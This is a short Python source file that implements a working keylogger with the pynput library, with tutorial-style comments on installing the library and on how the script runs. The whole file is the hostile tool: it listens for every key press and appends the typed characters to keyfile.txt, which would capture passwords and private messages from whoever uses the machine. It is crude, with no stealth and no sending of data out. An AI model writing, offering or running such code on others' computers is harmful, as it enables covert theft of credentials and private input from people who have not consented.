""" 
@Description pynput is a external lib so you can download it with pip
            -> pip install pynput
"""
from pynput import keyboard

""" 
@Description the 'key' came from 'keyboar.Listener(on_press)' method
             purpose of this function is only get user input and try to write
             in a txt file
"""
def keyPressed(key):
    # print(str(key))
    with open("keyfile.txt" , "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

""" 
@Description we use this 'if method' to  trigger the 'keyPressed' function 
            immediately when the script starts."
"""
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()